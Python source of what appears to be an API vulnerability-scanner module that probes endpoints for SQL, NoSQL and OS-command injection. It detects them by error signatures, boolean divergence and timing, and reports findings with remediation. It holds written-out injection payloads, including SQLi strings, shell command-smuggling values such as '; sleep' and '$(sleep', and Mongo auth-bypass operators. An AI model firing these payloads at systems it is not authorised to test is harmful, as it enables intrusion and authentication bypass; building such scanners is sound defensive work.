"""APIStrike injection module: SQLi / NoSQLi / OS-command injection.

Injection was a standalone item in the 2019 API Top 10 and, while folded into
broader categories in 2023, remains one of the highest-impact API flaws. This
module registers a dedicated 'INJECTION' taxonomy entry (so findings validate
and render cleanly) and confirms issues with real requests using several
techniques:

- error-based SQLi   : a payload provokes a database error string that was not
                       present in the baseline response (CWE-89, confirmed).
- boolean-blind SQLi : a TRUE vs FALSE condition yields materially different
                       responses, proving the input alters the query (firm).
- time-based SQLi    : a sleep/benchmark payload delays the response well past
                       a fast baseline and a fast control (CWE-89, confirmed).
- OS command (time)  : a shell sleep payload delays the response (CWE-78).
- NoSQL operator     : replacing a JSON string with a Mongo-style operator
                       ($ne/$gt/$regex) changes a deny into a success or grows
                       the result set (CWE-943, firm).

Injection points: query parameters, JSON body fields, and URL PATH segments.
For path injection the path must contain the marker 'INJECT' (e.g.
'/users/v1/INJECT'); the module substitutes a valid baseline value plus the
payload at that position (this is how the classic '/users/v1/{username}' raw-SQL
flaw is reached).

Safety: every payload is READ-ONLY / timing-only. No stacked destructive
statements (DROP/DELETE/UPDATE) are ever sent, so the module is safe to run in
safe mode. All traffic goes through the scope-gated client.

The module is transport-agnostic: it only needs a client exposing
`await client.request(method, url, params=?, json=?, headers=?)` returning an
object with `.status_code`, `.body`, and `.elapsed_ms`.
"""

import json
import urllib.parse
from dataclasses import dataclass, field
from typing import Dict, List, Optional

try:  # package import
    from apistrike.core.findings import Finding, OWASP_API_TOP_10
except Exception:  # pragma: no cover - flat-layout / verify fallback
    from findings import Finding, OWASP_API_TOP_10  # type: ignore

OWASP_ID = "INJECTION"
# Self-register so Finding(owasp_id="INJECTION") validates without touching
# findings.py. setdefault keeps this idempotent across repeated imports.
OWASP_API_TOP_10.setdefault(OWASP_ID, "Injection (SQLi / NoSQLi / Command)")

# Marker replaced by the injected value in path-location targets.
PATH_MARKER = "INJECT"

ALL_TECHNIQUES = ("error", "boolean", "time_sql", "time_cmd", "nosql")

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlite3.operationalerror",
    "sqlite_error",
    "unrecognized token",
    "near \"",
    "psycopg2",
    "org.postgresql.util.psqlexception",
    "pg::syntaxerror",
    "syntax error at or near",
    "ora-00933",
    "ora-01756",
    "microsoft odbc",
    "odbc sql server driver",
    "sqlstate",
]

SQLI_ERROR_PAYLOADS = ["'", "''", '"', "`", "');--", "' OR '1"]
SQLI_BOOLEAN_TRUE = "' OR '1'='1"
SQLI_BOOLEAN_FALSE = "' AND '1'='2"
SQLI_TIME_TEMPLATES = [
    "' OR SLEEP({d})-- ",
    '" OR SLEEP({d})-- ',
    "'; SELECT pg_sleep({d})-- ",
    "1) OR SLEEP({d})-- ",
    "' OR pg_sleep({d})-- ",
]
CMD_TIME_TEMPLATES = [
    "; sleep {d}",
    "| sleep {d}",
    "$(sleep {d})",
    "`sleep {d}`",
    "&& sleep {d}",
]
NOSQLI_OPERATORS = [{"$ne": None}, {"$gt": ""}, {"$ne": ""}, {"$regex": ".*"}]

DEFAULT_TIME_DELAY = 3
DEFAULT_TIME_THRESHOLD_MS = 2500
DEFAULT_BOOLEAN_LEN_TOLERANCE = 32


@dataclass
class InjectionTarget:
    method: str
    path: str
    param: str
    location: str = "query"  # "query" | "json" | "path"
    base_params: Dict[str, object] = field(default_factory=dict)
    base_body: Dict[str, object] = field(default_factory=dict)
    headers: Dict[str, str] = field(default_factory=dict)
    benign_value: str = "1"

    def __post_init__(self) -> None:
        self.method = self.method.upper().strip()
        if not self.path.startswith("/"):
            self.path = "/" + self.path
        loc = (self.location or "query").lower()
        if loc == "path":
            self.location = "path"
        elif loc in ("json", "body"):
            self.location = "json"
        else:
            self.location = "query"
        if self.location == "path" and PATH_MARKER not in self.path:
            raise ValueError(
                "path-location target requires the '{0}' marker in the path, "
                "e.g. /users/v1/{0}".format(PATH_MARKER)
            )


@dataclass
class InjectionResult:
    findings: List[Finding] = field(default_factory=list)
    notes: List[str] = field(default_factory=list)
    tests_run: int = 0
    requests_made: int = 0


class InjectionModule:
    OWASP_ID = OWASP_ID
    PATH_MARKER = PATH_MARKER

    def __init__(
        self,
        client,
        base_url: str,
        targets: List[InjectionTarget],
        *,
        techniques=ALL_TECHNIQUES,
        time_delay: int = DEFAULT_TIME_DELAY,
        time_threshold_ms: int = DEFAULT_TIME_THRESHOLD_MS,
        boolean_len_tolerance: int = DEFAULT_BOOLEAN_LEN_TOLERANCE,
        safe: bool = True,
    ) -> None:
        if not targets:
            raise ValueError("InjectionModule needs at least one InjectionTarget.")
        self.client = client
        self.base_url = base_url.rstrip("/")
        self.targets = list(targets)
        self.techniques = tuple(t.strip().lower() for t in techniques if t.strip())
        self.time_delay = int(time_delay)
        self.time_threshold_ms = float(time_threshold_ms)
        self.boolean_len_tolerance = int(boolean_len_tolerance)
        self.safe = safe
        self._requests = 0

    # -- helpers -------------------------------------------------------
    def _url(self, path: str) -> str:
        if not path.startswith("/"):
            path = "/" + path
        return self.base_url + path

    def _path_for(self, target: InjectionTarget, value) -> str:
        """Full request URL for a path-location target with `value` substituted."""
        placed = urllib.parse.quote(str(value), safe="")
        return self._url(target.path.replace(PATH_MARKER, placed))

    def _pv(self, target: InjectionTarget, payload: str):
        """Compose the value to inject.

        For path injection we prefix a valid baseline id so the query resolves
        to a real row before the payload takes effect (e.g. name1' OR '1'='1).
        """
        if target.location == "path":
            return "{0}{1}".format(target.benign_value, payload)
        return payload

    @staticmethod
    def _status(resp) -> int:
        return int(getattr(resp, "status_code", getattr(resp, "status", 0)) or 0)

    @staticmethod
    def _body(resp) -> str:
        return getattr(resp, "body", "") or ""

    @staticmethod
    def _elapsed(resp) -> float:
        return float(getattr(resp, "elapsed_ms", 0) or 0)

    async def _send(self, target: InjectionTarget, value):
        kwargs = {}
        if target.headers:
            kwargs["headers"] = dict(target.headers)
        if target.location == "path":
            url = self._path_for(target, value)
        elif target.location == "json":
            body = dict(target.base_body or {})
            body[target.param] = value
            kwargs["json"] = body
            url = self._url(target.path)
        else:
            params = dict(target.base_params or {})
            params[target.param] = value
            kwargs["params"] = params
            url = self._url(target.path)
        resp = await self.client.request(target.method, url, **kwargs)
        self._requests += 1
        return resp

    def _ev(self, check, target, value, status=None, elapsed=None, extra=None):
        if target.location == "path":
            url = self._url(target.path.replace(PATH_MARKER, str(value)))
        else:
            url = self._url(target.path)
        d = {
            "check": check,
            "method": target.method,
            "url": url,
            "param": target.param,
            "location": target.location,
            "payload": value if not isinstance(value, dict) else json.dumps(value),
        }
        if status is not None:
            d["status"] = status
        if elapsed is not None:
            d["elapsed_ms"] = round(float(elapsed), 1)
        if extra:
            d.update(extra)
        return d

    def _finding(self, *, title, severity, cwe, confidence, target, description, recommendation, evidence):
        return Finding(
            title=title,
            severity=severity,
            owasp_id=self.OWASP_ID,
            endpoint=target.path,
            cwe=cwe,
            confidence=confidence,
            description=description,
            recommendation=recommendation,
            evidence=evidence,
        )

    @staticmethod
    def _has_sql_error(body: str) -> Optional[str]:
        low = body.lower()
        for sig in SQL_ERROR_SIGNATURES:
            if sig in low:
                return sig
        return None

    def _where(self, target: InjectionTarget) -> str:
        return "path segment" if target.location == "path" else "parameter"

    # -- techniques ----------------------------------------------------
    async def _try_error_sql(self, target, base_body_low, result):
        result.tests_run += 1
        for payload in SQLI_ERROR_PAYLOADS:
            val = self._pv(target, payload)
            r = await self._send(target, val)
            body_low = self._body(r).lower()
            hit = None
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body_low and sig not in base_body_low:
                    hit = sig
                    break
            if hit:
                return self._finding(
                    title="SQL injection (error-based) in '{0}' at {1} {2}".format(
                        target.param, target.method, target.path
                    ),
                    severity="high",
                    cwe="CWE-89",
                    confidence="confirmed",
                    target=target,
                    description=(
                        "Injecting {0!r} into {1} '{2}' caused the backend to return a database "
                        "error ({3!r}) that was absent from the baseline response. The value is "
                        "concatenated into a SQL statement.".format(
                            val, self._where(target), target.param, hit
                        )
                    ),
                    recommendation=(
                        "Use parameterised queries / prepared statements and validate input types. "
                        "Never build SQL by string concatenation of user-supplied values."
                    ),
                    evidence=[
                        self._ev("error_payload", target, val, self._status(r), self._elapsed(r), extra={"signature": hit}),
                    ],
                )
        return None

    async def _try_boolean_sql(self, target, result):
        result.tests_run += 1
        tval = self._pv(target, SQLI_BOOLEAN_TRUE)
        fval = self._pv(target, SQLI_BOOLEAN_FALSE)
        rt = await self._send(target, tval)
        rf = await self._send(target, fval)
        bt, bf = self._body(rt), self._body(rf)
        if self._has_sql_error(bt) or self._has_sql_error(bf):
            return None  # error-based path handles this more strongly
        diff = (self._status(rt) != self._status(rf)) or (
            abs(len(bt) - len(bf)) > self.boolean_len_tolerance
        )
        if diff:
            return self._finding(
                title="SQL injection (boolean-based blind) in '{0}' at {1} {2}".format(
                    target.param, target.method, target.path
                ),
                severity="high",
                cwe="CWE-89",
                confidence="firm",
                target=target,
                description=(
                    "A TRUE condition ({0!r}) and a FALSE condition ({1!r}) injected into {2} '{3}' "
                    "produced materially different responses (status or body length), indicating "
                    "the input alters the SQL WHERE clause (blind boolean-based SQL injection).".format(
                        tval, fval, self._where(target), target.param
                    )
                ),
                recommendation=(
                    "Use parameterised queries; validate/type-check input; return uniform responses "
                    "that do not reveal query truthiness."
                ),
                evidence=[
                    self._ev("boolean_true", target, tval, self._status(rt), extra={"len": len(bt)}),
                    self._ev("boolean_false", target, fval, self._status(rf), extra={"len": len(bf)}),
                ],
            )
        return None

    async def _try_time_sql(self, target, base_elapsed, result):
        result.tests_run += 1
        for template in SQLI_TIME_TEMPLATES:
            payload = template.format(d=self.time_delay)
            val = self._pv(target, payload)
            r = await self._send(target, val)
            t = self._elapsed(r)
            if (t - base_elapsed) >= self.time_threshold_ms and t >= self.time_delay * 1000 * 0.6:
                control = await self._send(target, target.benign_value)
                if self._elapsed(control) < self.time_threshold_ms:
                    return self._finding(
                        title="SQL injection (time-based blind) in '{0}' at {1} {2}".format(
                            target.param, target.method, target.path
                        ),
                        severity="critical",
                        cwe="CWE-89",
                        confidence="confirmed",
                        target=target,
                        description=(
                            "A time-based payload ({0!r}) delayed the response to ~{1:.0f} ms versus a "
                            "~{2:.0f} ms baseline, while a benign control stayed fast. {3} '{4}' is "
                            "injectable into a SQL query (blind).".format(
                                val, t, base_elapsed, self._where(target).capitalize(), target.param
                            )
                        ),
                        recommendation=(
                            "Use parameterised queries; never concatenate input into SQL. Add query "
                            "timeouts and alert on anomalous execution times."
                        ),
                        evidence=[
                            self._ev("baseline", target, target.benign_value, elapsed=base_elapsed),
                            self._ev("time_payload", target, val, self._status(r), t),
                            self._ev("control", target, target.benign_value, elapsed=self._elapsed(control)),
                        ],
                    )
        return None

    async def _try_time_cmd(self, target, base_elapsed, result):
        result.tests_run += 1
        for template in CMD_TIME_TEMPLATES:
            payload = template.format(d=self.time_delay)
            val = self._pv(target, payload)
            r = await self._send(target, val)
            t = self._elapsed(r)
            if (t - base_elapsed) >= self.time_threshold_ms and t >= self.time_delay * 1000 * 0.6:
                control = await self._send(target, target.benign_value)
                if self._elapsed(control) < self.time_threshold_ms:
                    return self._finding(
                        title="OS command injection (time-based) in '{0}' at {1} {2}".format(
                            target.param, target.method, target.path
                        ),
                        severity="critical",
                        cwe="CWE-78",
                        confidence="confirmed",
                        target=target,
                        description=(
                            "A shell time-delay payload ({0!r}) delayed the response to ~{1:.0f} ms versus "
                            "a ~{2:.0f} ms baseline, while a benign control stayed fast. {3} '{4}' is passed "
                            "to a system shell (OS command injection).".format(
                                val, t, base_elapsed, self._where(target).capitalize(), target.param
                            )
                        ),
                        recommendation=(
                            "Never pass user input to a shell. Use native library calls or exec APIs with "
                            "argument arrays, and validate against a strict allowlist."
                        ),
                        evidence=[
                            self._ev("baseline", target, target.benign_value, elapsed=base_elapsed),
                            self._ev("time_payload", target, val, self._status(r), t),
                            self._ev("control", target, target.benign_value, elapsed=self._elapsed(control)),
                        ],
                    )
        return None

    async def _try_nosql(self, target, baseline, result):
        if target.location != "json":
            result.notes.append(
                "NoSQL operator injection skipped for '{0}' (only tested on JSON body params).".format(target.param)
            )
            return None
        result.tests_run += 1
        base_status = self._status(baseline)
        base_len = len(self._body(baseline))
        for op in NOSQLI_OPERATORS:
            r = await self._send(target, op)
            became_success = self._status(r) in (200, 201, 202) and base_status in (400, 401, 403)
            grew = (len(self._body(r)) - base_len) > self.boolean_len_tolerance
            if became_success or grew:
                return self._finding(
                    title="NoSQL operator injection in '{0}' at {1} {2}".format(
                        target.param, target.method, target.path
                    ),
                    severity="high",
                    cwe="CWE-943",
                    confidence="firm",
                    target=target,
                    description=(
                        "Replacing '{0}' with a MongoDB-style operator ({1}) changed the response from "
                        "HTTP {2} to HTTP {3}, indicating the value is used directly in a NoSQL query and "
                        "can be manipulated (e.g. authentication bypass or filter evasion).".format(
                            target.param, json.dumps(op), base_status, self._status(r)
                        )
                    ),
                    recommendation=(
                        "Reject non-scalar JSON for fields expected to be strings; cast/validate types "
                        "server-side; use query builders that treat operators as data, not syntax."
                    ),
                    evidence=[
                        self._ev("baseline", target, target.benign_value, base_status),
                        self._ev("nosql_operator", target, op, self._status(r)),
                    ],
                )
        return None

    async def _scan_target(self, target, result):
        baseline = await self._send(target, target.benign_value)
        base_body_low = self._body(baseline).lower()
        base_elapsed = self._elapsed(baseline)

        # SQL: report the strongest single technique (time > error > boolean).
        sql_finding = None
        if "time_sql" in self.techniques:
            sql_finding = await self._try_time_sql(target, base_elapsed, result)
        if sql_finding is None and "error" in self.techniques:
            sql_finding = await self._try_error_sql(target, base_body_low, result)
        if sql_finding is None and "boolean" in self.techniques:
            sql_finding = await self._try_boolean_sql(target, result)
        if sql_finding is not None:
            result.findings.append(sql_finding)

        if "time_cmd" in self.techniques:
            f = await self._try_time_cmd(target, base_elapsed, result)
            if f is not None:
                result.findings.append(f)

        if "nosql" in self.techniques:
            f = await self._try_nosql(target, baseline, result)
            if f is not None:
                result.findings.append(f)

    async def run(self, store=None) -> InjectionResult:
        result = InjectionResult()
        for target in self.targets:
            await self._scan_target(target, result)
        result.requests_made = self._requests
        if not result.findings:
            result.notes.append(
                "No injection confirmed: payloads did not trigger DB errors, boolean divergence, "
                "timing delays, or operator bypass."
            )
        if store is not None:
            for finding in result.findings:
                store.add(finding)
        return result
